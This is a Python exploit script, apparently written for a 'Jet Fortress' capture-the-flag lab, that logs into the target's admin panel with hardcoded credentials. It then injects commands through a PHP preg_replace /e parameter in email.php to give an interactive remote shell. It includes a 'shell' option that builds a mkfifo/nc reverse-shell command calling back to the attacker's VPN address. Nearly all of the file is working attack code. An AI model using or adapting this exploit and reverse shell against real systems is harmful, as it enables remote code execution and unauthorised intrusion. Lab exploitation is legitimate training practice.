#########################################################
#							#
#	Make sure Jet Fortress' VPN is running		#
#							#
#	Usage: python3 Jet-Plane.py			#
#							#
#########################################################

import socket
import os
import urllib
import requests
import fcntl
import struct

# URLS
COOKIE_URL = "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php"
LOGIN_URL = "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/dologin.php"
EXPLOIT_URL = "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/email.php"
DASHBOARD_URL = "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/dashboard.php"

# MSG START N END
START_OF_OUTPUT = "<hr>\n        <p>"
END_OF_OUTPUT = "<p>.<br>"

# POST DATA
POST1 = "swearwords%5B%2FFuck%2Fe%5D=system('"
POST2 = "')&swearwords%5B%2Fshit%2Fi%5D=poop&swearwords%5B%2Fass%2Fi%5D=behind&swearwords%5B%2Fdick%2Fi%5D=penis&swearwords%5B%2Fwhore%2Fi%5D=escort&swearwords%5B%2Fasshole%2Fi%5D=bad+person&to=email%40email.com&subject=Email&message=%3Cp%3E.%3Cbr%3E%3C%2Fp%3E%3Cp%3EFuck%3C%2Fp%3E%3Cp%3E.%3C%2Fp%3E%3Cp%3E.%3C%2Fp%3E%3Cp%3EEND_ME0XAA55%3Cbr%3E%3C%2Fp%3E%3Cp%3E%3Cbr%3E%3C%2Fp%3E&_wysihtml5_mode=1"

# CREDS
USERNAME = "admin"
PASSWORD = "Hackthesystem200"

# GRAB LOCAL tun0 IP FOR REVSHELL
def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,
        struct.pack('256s', ifname[:15])
    )[20:24])
myip = get_ip_address(b'tun0')

# WELCOME MESSAGE
def Start_Program():
	print("*"*46)
	print("Welcome to Plane Crash.")
	print(" ")
	print("This is to make moving around Jet's server a\nwhole lot easier than using Burp.")
	print(" ")
	print("Type help for commands and usage")
	print(" ")
	print("Created by RomanRII, IamIsmael & Drragonn")
	print("*"*46)
	Command_Funct()

# AUTH DATA
def Command_Funct():
        login_post_data = {
            'username': USERNAME,
           'password': PASSWORD
        }
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Referer": "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/dashboard.php",
            "Content-Type": "application/x-www-form-urlencoded",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1"
        }

        with requests.Session() as s:
            # LOGIN INTO APPLICATION
            response = s.get(COOKIE_URL)
            s.headers['User-Agent'] = '0xAA55 W4S H3rE'
            r = s.post(LOGIN_URL, data=login_post_data, cookies=s.cookies)  
            command = " "
            curr_path = "/var/www/html/dirb_safe_dir_rf9EmcEIx/admin"
            # COMMAND LOOP
            while True:
                command = input("www-root@jet$ ")
                if command == 'pwd':
                    command = 'echo ' + curr_path
                elif command == 'ls':
                    command = 'ls -la'
                elif command == 'shell':
                    print("")
                    print("For reverse-shell to the machine, please")
                    myport = input("enter the port you are listening on nc = ")
                    myport = str(myport)
                    command = (f"mkfifo /tmp/lneo; nc {myip} {myport} 0</tmp/lneo | /bin/bash >/tmp/lneo 2>&1; rm /tmp/lneo")
                    command = urllib.parse.quote(command.encode("ascii"))
                elif "cd" in command:
                    print(" ")
                    print("*"*60)
                    print("cd does not work properly with this server.")
                    print("We will list all the files in the inputted directory, but you will need to specify the directory again\nto interact with any of the listed files.")
                    print("*"*60)
                    print(" ")
                    cdDir = input("Which directory would you like to view?: ")
                    command = "ls -la " + cdDir
                elif command == 'get':
                    print("Download file using this format: /root/passwd")
                    getFile = input("Which file would you like to download: ")
#                   Start to add function in
                elif command == 'help':
                        print(" ")
                        print("*"*60)
                        print("Commands: ")
                        print(" ")
                        print("    shell	 Sends reverse shell command to server.")
                        print("    get	         Downloads specified file.")
                        print("    cd		 Asks for directory, lists files within the dir")
                        print(" ")
                        print("Usage: ")
                        print(" ")
                        print("    shell	 Asks for listening port to send shell to.")
                        print("    get           Asks for which file you want to download.")
                        print("    cd            Asks for what directory you want to look at.")
                        print("*"*60)
                        print(" ")
		# COMMAND URL REQUEST AND RESPONSE
                POSTRequest = POST1 + command + POST2
                r = s.post(EXPLOIT_URL, data=POSTRequest, headers=headers, cookies=s.cookies)
                start = r.text.find(START_OF_OUTPUT)
                end = r.text.find(END_OF_OUTPUT)
                print(r.text[start + len(START_OF_OUTPUT):end])
                if command == "exit":
                    break

Start_Program()